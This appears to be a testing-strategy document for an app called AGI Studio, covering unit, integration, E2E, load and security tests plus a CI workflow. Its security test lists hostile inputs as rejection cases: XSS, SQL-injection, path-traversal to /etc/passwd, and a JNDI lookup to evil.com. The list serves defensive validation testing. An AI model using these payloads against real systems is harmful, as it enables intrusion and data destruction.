# TESTING STRATEGY & FRAMEWORK

**AGI Studio Quality Assurance**  
**Version:** 2.0.0-QA  
**Target Coverage:** >80%

---

## TESTING PHILOSOPHY

1. **Test Early, Test Often:** Shift-left testing approach
2. **Test Pyramid:** Many unit tests, some integration tests, few E2E tests
3. **TDD/BDD:** Test-Driven and Behavior-Driven Development
4. **Continuous Testing:** Automated tests in CI/CD pipeline
5. **Production-Like:** Test in environments that mirror production

---

## TESTING PYRAMID

```
       /\
      /E2E\        ~5% - End-to-End (Playwright)
     /______\
    /        \
   /Integration\   ~15% - Integration & API Tests
  /____________\
 /              \
/   Unit Tests   \  ~80% - Unit Tests (pytest, vitest)
/__________________\
```

---

## TEST CATEGORIES

### 1. Unit Tests

**Purpose:** Test individual functions and classes in isolation  
**Coverage Target:** >90%  
**Execution Time:** <1 minute for entire suite

#### Backend Unit Tests (pytest)

```python
# backend/tests/unit/test_input_validation.py
import pytest
from api.models import PromptRequest
from pydantic import ValidationError

class TestPromptValidation:
    """Test prompt input validation"""
    
    def test_valid_prompt(self):
        """Test that valid prompts are accepted"""
        request = PromptRequest(prompt="Hello, how are you?")
        assert request.prompt == "Hello, how are you?"
    
    def test_prompt_too_short(self):
        """Test that empty prompts are rejected"""
        with pytest.raises(ValidationError):
            PromptRequest(prompt="")
    
    def test_prompt_too_long(self):
        """Test that overly long prompts are rejected"""
        long_prompt = "x" * 10001
        with pytest.raises(ValidationError):
            PromptRequest(prompt=long_prompt)
    
    def test_unsafe_characters(self):
        """Test that unsafe characters are rejected"""
        with pytest.raises(ValidationError):
            PromptRequest(prompt="<script>alert('xss')</script>")
    
    @pytest.mark.parametrize("temp", [0.0, 0.5, 1.0, 2.0])
    def test_valid_temperatures(self, temp):
        """Test valid temperature ranges"""
        request = PromptRequest(prompt="Test", temperature=temp)
        assert request.temperature == temp
    
    def test_invalid_temperature(self):
        """Test that invalid temperatures are rejected"""
        with pytest.raises(ValidationError):
            PromptRequest(prompt="Test", temperature=3.0)
```

```python
# backend/tests/unit/core/test_node_base.py
import pytest
from core.node_base import NodeBase

class TestNodeBase:
    """Test base node functionality"""
    
    @pytest.fixture
    def node(self):
        """Create a test node"""
        return NodeBase(node_id="test-node", config={"param": "value"})
    
    def test_initialization(self, node):
        """Test node initialization"""
        assert node.node_id == "test-node"
        assert node.config == {"param": "value"}
        assert node.state == "IDLE"
        assert node.log == []
    
    def test_log_event(self, node):
        """Test logging functionality"""
        node.log_event("Test message")
        assert len(node.log) == 1
        assert node.log[0] == "Test message"
    
    def test_stop(self, node):
        """Test stopping a node"""
        node.state = "RUNNING"
        node.stop()
        assert node.state == "IDLE"
    
    def test_run_not_implemented(self, node):
        """Test that run() raises NotImplementedError"""
        with pytest.raises(NotImplementedError):
            node.run()
```

#### Frontend Unit Tests (Vitest)

```typescript
// frontend/tests/unit/utils/validation.test.ts
import { describe, it, expect } from 'vitest'
import { validatePrompt, sanitizeInput } from '../../utils/validation'

describe('Input Validation', () => {
  describe('validatePrompt', () => {
    it('should accept valid prompts', () => {
      const result = validatePrompt('Hello, world!')
      expect(result.isValid).toBe(true)
      expect(result.error).toBeUndefined()
    })
    
    it('should reject empty prompts', () => {
      const result = validatePrompt('')
      expect(result.isValid).toBe(false)
      expect(result.error).toBe('Prompt cannot be empty')
    })
    
    it('should reject prompts that are too long', () => {
      const longPrompt = 'x'.repeat(10001)
      const result = validatePrompt(longPrompt)
      expect(result.isValid).toBe(false)
      expect(result.error).toContain('too long')
    })
  })
  
  describe('sanitizeInput', () => {
    it('should remove HTML tags', () => {
      const result = sanitizeInput('<script>alert("xss")</script>')
      expect(result).not.toContain('<script>')
    })
    
    it('should trim whitespace', () => {
      const result = sanitizeInput('  hello  ')
      expect(result).toBe('hello')
    })
  })
})
```

```typescript
// frontend/tests/unit/components/Header.test.tsx
import { describe, it, expect, vi } from 'vitest'
import { render, screen, fireEvent } from '@testing-library/react'
import Header from '../../../components/Header'
import { TabId } from '../../../types'

describe('Header Component', () => {
  it('renders all navigation tabs', () => {
    const setActiveTab = vi.fn()
    render(<Header activeTab={TabId.AGI_BUILDER} setActiveTab={setActiveTab} />)
    
    expect(screen.getByText('AGI Builder')).toBeInTheDocument()
    expect(screen.getByText('AGI Trainer')).toBeInTheDocument()
    expect(screen.getByText('The Lab')).toBeInTheDocument()
  })
  
  it('highlights the active tab', () => {
    const setActiveTab = vi.fn()
    const { container } = render(
      <Header activeTab={TabId.AGI_BUILDER} setActiveTab={setActiveTab} />
    )
    
    const activeTab = container.querySelector('[data-active="true"]')
    expect(activeTab).toHaveTextContent('AGI Builder')
  })
  
  it('calls setActiveTab when a tab is clicked', () => {
    const setActiveTab = vi.fn()
    render(<Header activeTab={TabId.AGI_BUILDER} setActiveTab={setActiveTab} />)
    
    fireEvent.click(screen.getByText('AGI Trainer'))
    expect(setActiveTab).toHaveBeenCalledWith(TabId.AGI_TRAINER)
  })
})
```

### 2. Integration Tests

**Purpose:** Test interaction between components  
**Coverage Target:** >70%  
**Execution Time:** <5 minutes

```python
# backend/tests/integration/test_api_endpoints.py
import pytest
from fastapi.testclient import TestClient
from api.main import app

@pytest.fixture
def client():
    """Create test client"""
    return TestClient(app)

class TestAPIEndpoints:
    """Test API endpoint integration"""
    
    def test_health_check(self, client):
        """Test health check endpoint"""
        response = client.get("/health")
        assert response.status_code == 200
        assert response.json()["status"] == "healthy"
    
    def test_generate_valid_request(self, client):
        """Test generation with valid request"""
        response = client.post(
            "/api/v1/generate",
            json={"prompt": "Hello, world!"}
        )
        assert response.status_code == 200
        assert "text" in response.json()
    
    def test_generate_invalid_request(self, client):
        """Test generation with invalid request"""
        response = client.post(
            "/api/v1/generate",
            json={"prompt": ""}
        )
        assert response.status_code == 422  # Validation error
    
    def test_rate_limiting(self, client):
        """Test rate limiting kicks in"""
        # Make requests until rate limited
        for _ in range(15):
            client.post("/api/v1/generate", json={"prompt": "test"})
        
        response = client.post("/api/v1/generate", json={"prompt": "test"})
        assert response.status_code == 429  # Too many requests
```

```python
# backend/tests/integration/test_database.py
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from db.models import Base, User, Conversation

@pytest.fixture
def db_session():
    """Create test database session"""
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    session = Session()
    yield session
    session.close()

class TestDatabaseOperations:
    """Test database CRUD operations"""
    
    def test_create_user(self, db_session):
        """Test creating a user"""
        user = User(username="testuser", email="test@example.com")
        db_session.add(user)
        db_session.commit()
        
        retrieved = db_session.query(User).filter_by(username="testuser").first()
        assert retrieved is not None
        assert retrieved.email == "test@example.com"
    
    def test_create_conversation(self, db_session):
        """Test creating a conversation"""
        user = User(username="testuser", email="test@example.com")
        db_session.add(user)
        db_session.commit()
        
        conversation = Conversation(user_id=user.id, title="Test Chat")
        db_session.add(conversation)
        db_session.commit()
        
        retrieved = db_session.query(Conversation).filter_by(user_id=user.id).first()
        assert retrieved is not None
        assert retrieved.title == "Test Chat"
```

### 3. End-to-End Tests

**Purpose:** Test complete user workflows  
**Coverage Target:** Critical paths only  
**Execution Time:** <15 minutes

```typescript
// frontend/tests/e2e/conversation.spec.ts
import { test, expect } from '@playwright/test'

test.describe('Conversation Flow', () => {
  test('user can create and interact with a conversation', async ({ page }) => {
    // Navigate to app
    await page.goto('http://localhost:3000')
    
    // Wait for app to load
    await expect(page.locator('h1')).toContainText('AGI Studio')
    
    // Navigate to AGI Builder tab
    await page.click('text=AGI Builder')
    
    // Enter a prompt
    const promptInput = page.locator('textarea[placeholder*="prompt"]')
    await promptInput.fill('Hello, can you help me?')
    
    // Submit
    await page.click('button:has-text("Generate")')
    
    // Wait for response
    await expect(page.locator('.response')).toBeVisible({ timeout: 10000 })
    
    // Verify response appears
    const response = await page.locator('.response').textContent()
    expect(response).toBeTruthy()
    expect(response.length).toBeGreaterThan(0)
  })
  
  test('user can load a saved conversation', async ({ page }) => {
    await page.goto('http://localhost:3000')
    
    // Create a conversation first
    await page.click('text=AGI Builder')
    await page.fill('textarea', 'Test conversation')
    await page.click('button:has-text("Generate")')
    await page.waitForSelector('.response')
    
    // Save conversation
    await page.click('button:has-text("Save")')
    
    // Navigate away
    await page.click('text=AGI Trainer')
    
    // Come back
    await page.click('text=AGI Builder')
    
    // Load conversation
    await page.click('button:has-text("Load")')
    await page.click('text=Test conversation')
    
    // Verify conversation loaded
    await expect(page.locator('textarea')).toHaveValue('Test conversation')
  })
})
```

### 4. Performance Tests

**Purpose:** Ensure system meets performance requirements  
**Tools:** pytest-benchmark, k6, Apache JMeter

```python
# backend/tests/performance/test_api_performance.py
import pytest
from fastapi.testclient import TestClient
from api.main import app

@pytest.fixture
def client():
    return TestClient(app)

def test_generate_performance(benchmark, client):
    """Benchmark generation endpoint"""
    def make_request():
        return client.post(
            "/api/v1/generate",
            json={"prompt": "Hello, world!", "max_tokens": 50}
        )
    
    result = benchmark(make_request)
    assert result.status_code == 200

# Run with: pytest tests/performance --benchmark-only
```

```javascript
// Load testing with k6
// tests/performance/load_test.js
import http from 'k6/http';
import { check, sleep } from 'k6';

export const options = {
  stages: [
    { duration: '30s', target: 20 },  // Ramp up to 20 users
    { duration: '1m', target: 20 },   // Stay at 20 users
    { duration: '10s', target: 0 },   // Ramp down to 0
  ],
  thresholds: {
    http_req_duration: ['p(95)<500'], // 95% of requests under 500ms
    http_req_failed: ['rate<0.01'],   // Error rate < 1%
  },
};

export default function () {
  const url = 'http://localhost:8000/api/v1/generate';
  const payload = JSON.stringify({
    prompt: 'Hello, how are you?',
  });
  
  const params = {
    headers: {
      'Content-Type': 'application/json',
    },
  };
  
  const response = http.post(url, payload, params);
  
  check(response, {
    'status is 200': (r) => r.status === 200,
    'response has text': (r) => r.json().hasOwnProperty('text'),
  });
  
  sleep(1);
}

// Run with: k6 run tests/performance/load_test.js
```

### 5. Security Tests

**Purpose:** Identify security vulnerabilities  
**Tools:** Bandit, Safety, OWASP ZAP

```python
# backend/tests/security/test_input_sanitization.py
import pytest
from api.models import PromptRequest
from pydantic import ValidationError

class TestSecurityValidation:
    """Test security-related input validation"""
    
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('XSS')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "<img src=x onerror=alert('XSS')>",
    ])
    def test_rejects_malicious_input(self, malicious_input):
        """Test that malicious inputs are rejected"""
        with pytest.raises(ValidationError):
            PromptRequest(prompt=malicious_input)
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        # This should be handled by parameterized queries
        malicious = "admin' OR '1'='1"
        # Should not raise, but should be safely escaped in queries
        request = PromptRequest(prompt=malicious)
        # Verify it's sanitized
        assert "'" not in request.prompt or request.prompt == malicious
```

---

## TEST DATA MANAGEMENT

### Fixtures

```python
# backend/tests/conftest.py
import pytest
from typing import Generator
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, Session

@pytest.fixture(scope="session")
def test_db_engine():
    """Create test database engine"""
    engine = create_engine("sqlite:///:memory:")
    yield engine
    engine.dispose()

@pytest.fixture(scope="function")
def db_session(test_db_engine) -> Generator[Session, None, None]:
    """Create a test database session"""
    connection = test_db_engine.connect()
    transaction = connection.begin()
    Session = sessionmaker(bind=connection)
    session = Session()
    
    yield session
    
    session.close()
    transaction.rollback()
    connection.close()

@pytest.fixture
def sample_user():
    """Sample user data"""
    return {
        "username": "testuser",
        "email": "test@example.com",
        "password": "SecurePass123!"
    }

@pytest.fixture
def sample_prompt():
    """Sample prompt data"""
    return {
        "prompt": "Explain quantum computing",
        "max_tokens": 150,
        "temperature": 0.7
    }
```

### Test Data Factories

```python
# backend/tests/factories.py
from factory import Factory, Faker, Sequence
from db.models import User, Conversation

class UserFactory(Factory):
    class Meta:
        model = User
    
    username = Sequence(lambda n: f"user{n}")
    email = Faker('email')

class ConversationFactory(Factory):
    class Meta:
        model = Conversation
    
    user_id = 1
    title = Faker('sentence')

# Usage in tests
def test_user_creation(db_session):
    user = UserFactory.create()
    db_session.add(user)
    db_session.commit()
    assert user.id is not None
```

---

## CONTINUOUS INTEGRATION

### GitHub Actions Workflow

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  backend-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ['3.10', '3.11']
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python ${{ matrix.python-version }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
      
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}
      
      - name: Install dependencies
        run: |
          cd backend
          pip install -r requirements.txt
          pip install pytest pytest-cov pytest-asyncio
      
      - name: Run unit tests
        run: |
          cd backend
          pytest tests/unit -v --cov=. --cov-report=xml
      
      - name: Run integration tests
        run: |
          cd backend
          pytest tests/integration -v
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          file: ./backend/coverage.xml
          flags: backend
  
  frontend-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
          cache-dependency-path: frontend/package-lock.json
      
      - name: Install dependencies
        run: |
          cd frontend
          npm ci
      
      - name: Run tests
        run: |
          cd frontend
          npm run test:coverage
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          file: ./frontend/coverage/coverage-final.json
          flags: frontend
  
  e2e-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
      
      - name: Install Playwright
        run: |
          cd frontend
          npm ci
          npx playwright install --with-deps
      
      - name: Run E2E tests
        run: |
          cd frontend
          npm run test:e2e
      
      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: playwright-report
          path: frontend/playwright-report/
```

---

## COVERAGE REQUIREMENTS

### Minimum Coverage Targets

| Component | Unit | Integration | E2E |
|-----------|------|-------------|-----|
| Backend API | 90% | 80% | Critical paths |
| Core Logic | 95% | 85% | - |
| Frontend Components | 85% | 70% | Critical flows |
| Database Layer | 90% | 90% | - |
| Security | 100% | 100% | All attack vectors |

---

## QUALITY GATES

### Pre-Merge Requirements

- [ ] All tests pass
- [ ] Coverage meets minimum thresholds
- [ ] No critical security vulnerabilities
- [ ] Linting passes
- [ ] Type checking passes
- [ ] Performance benchmarks met
- [ ] Code review approved

---

**Document Version:** 1.0  
**Last Updated:** November 23, 2025  
**Status:** APPROVED
